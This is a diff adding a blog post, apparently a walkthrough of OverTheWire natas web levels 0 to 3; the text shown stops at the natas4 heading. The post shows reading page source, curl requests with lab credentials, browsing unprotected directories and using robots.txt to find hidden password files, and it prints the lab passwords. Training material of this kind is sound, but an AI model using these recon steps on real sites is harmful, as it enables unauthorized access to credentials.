@@ -1,0 +1,1012 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Natas Challenges (part 1) - z0x90</title><meta name="Description" content="The first in a multi-part walkthrough for the OverTheWire natas levels."><meta property="og:title" content="Natas Challenges (part 1)" />
+<meta property="og:description" content="The first in a multi-part walkthrough for the OverTheWire natas levels." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/natas_challenges_part1/" />
+<meta property="og:image" content="https://example.com/logo.png"/>
+<meta property="article:published_time" content="2020-06-01T18:26:53+00:00" />
+<meta property="article:modified_time" content="2020-06-01T18:26:53+00:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="Natas Challenges (part 1)"/>
+<meta name="twitter:description" content="The first in a multi-part walkthrough for the OverTheWire natas levels."/>
+<meta name="application-name" content="z0x90">
+<meta name="apple-mobile-web-app-title" content="z0x90"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/natas_challenges_part1/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Natas Challenges (part 1)",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/natas_challenges_part1\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "OTW, natas, wargames","wordcount":  2177 ,
+        "url": "https:\/\/example.com\/natas_challenges_part1\/","datePublished": "2020-06-01T18:26:53+00:00","dateModified": "2020-06-01T18:26:53+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "z0x90","logo": "https:\/\/example.com\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "The first in a multi-part walkthrough for the OverTheWire natas levels."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="z0x90"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>z0x90</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/z0x90/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="z0x90"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>z0x90</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/z0x90/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Natas Challenges (part 1)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span>&nbsp;<span class="post-category">included in <a href="/categories/otw/"><i class="far fa-folder fa-fw"></i>OTW</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-01">2020-06-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2177 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;11 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#natas0">natas0</a></li>
+        <li><a href="#natas1">natas1</a></li>
+        <li><a href="#natas2">natas2</a></li>
+        <li><a href="#natas3">natas3</a></li>
+        <li><a href="#natas4">natas4</a></li>
+        <li><a href="#natas5">natas5</a></li>
+        <li><a href="#natas6">natas6</a></li>
+        <li><a href="#natas7">natas7</a></li>
+        <li><a href="#natas8">natas8</a></li>
+        <li><a href="#natas9">natas9</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>The Natas challenges are all web server related <a href="https://en.wikipedia.org/wiki/Wargame_%28hacking%29" target="_blank" rel="noopener noreffer">wargames</a> provided by OverTheWire. OverTheWire has been around for quite some time and is a very good way to get introduced to CTFs and thinking in the way needed to solve these sorts of challenges.</p>
+<p>The concept behind these wargames is that they get progressive harder as you move through the levels, requiring more and more research into common vulnerabilities in contrived cases.The start of the challenges can be found here: <a href="https://overthewire.org/wargames/natas/natas0.html" target="_blank" rel="noopener noreffer">challenges</a>. This post will cover natas levels 0 through 9 and my solutions to them.</p>
+<h3 id="natas0">natas0</h3>
+<p>The first natas challenge can be found here: <a href="http://natas0.natas.labs.overthewire.org/">http://natas0.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">User</span><span class="o">:</span> <span class="n">natas0</span>
+<span class="n">Pass</span><span class="o">:</span> <span class="n">natas0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>First thing to do is view the source of the page.</p>
+<p>And real quick we&rsquo;ve solved it by a &ldquo;developer&rdquo; leaving the password as a comment in the code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas0&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;natas0&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas0<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+You can find the password for the next level on this page.
+    <span class="c">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>On to the next challenge.</p>
+<h3 id="natas1">natas1</h3>
+<p>Starting this off by going to: <a href="http://natas1.natas.labs.overthewire.org/">http://natas1.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">User</span><span class="o">:</span> <span class="n">natas1</span>
+<span class="n">Pass</span><span class="o">:</span> <span class="n">gtVrDuiDfck831PqWsLEZy5gyDz1clto</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Same hint as last time, the password is somewhere in the page, however right clicking is disabled.</p>
+<p>There&rsquo;s a few different ways to solve this. First most web browsers allow someone to open up the Developer Tools regardless of what protections may be in place so the source can still be looked at.</p>
+<p>However, will do this a different way since the page is fairly simple, using <a href="https://en.wikipedia.org/wiki/CURL" target="_blank" rel="noopener noreffer">curl</a>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">$ curl -u natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto http://natas1.natas.labs.overthewire.org/
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas1&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;gtVrDuiDfck831PqWsLEZy5gyDz1clto&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span> <span class="na">oncontextmenu</span><span class="o">=</span><span class="s">&#34;javascript:alert(&#39;right clicking has been blocked!&#39;);return false;&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas1<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+You can find the password for the
+next level on this page, but rightclicking has been blocked!
+
+<span class="c">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="natas2">natas2</h3>
+<p>Starting this off by going to: <a href="http://natas2.natas.labs.overthewire.org/">http://natas2.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas2
+Pass: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+</code></pre></td></tr></table>
+</div>
+</div><p>Well the hint says there&rsquo;s nothing on the page. So that&rsquo;s a bit odd. Using <code>curl</code> again to pull down the source.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">$ curl -u natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi http://natas2.natas.labs.overthewire.org/
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas2&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas2<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+There is nothing on this page
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;files/pixel.png&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Curious, seems there is a pixel on the page. Opening the pixel gives a 1x1 pixel. Not too interesting. However, it may be possible that the &ldquo;files/&rdquo; directory is open for anyone to browse it and isn&rsquo;t properly locked down.</p>
+<p>Checking out: <a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a> reveals that there&rsquo;s a <code>users.txt</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="c1"># username:password</span>
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="natas3">natas3</h3>
+<p>Starting this off by going to: <a href="http://natas3.natas.labs.overthewire.org/">http://natas3.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas3
+Pass: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+</code></pre></td></tr></table>
+</div>
+</div><p>Again, with nothing on the page, source shows:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas3&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas3<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+There is nothing on this page
+<span class="c">&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Well, knowing that Google is built on the ability to crawl through webpages with robots. Wonder if there&rsquo;s something in the <a href="https://en.wikipedia.org/wiki/Robots_exclusion_standard" target="_blank" rel="noopener noreffer">robots.txt</a> file that could give some hints as to what the answer is.</p>
+<p>Robots.txt:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">User-agent: *
+Disallow: /s3cr3t/
+</code></pre></td></tr></table>
+</div>
+</div><p>Looks like there&rsquo;s another possible directory that could be browsed through, putting it all together:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">http://natas3.natas.labs.overthewire.org/s3cr3t
+</code></pre></td></tr></table>
+</div>
+</div><p>And there&rsquo;s a users.txt:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="natas4">natas4</h3>
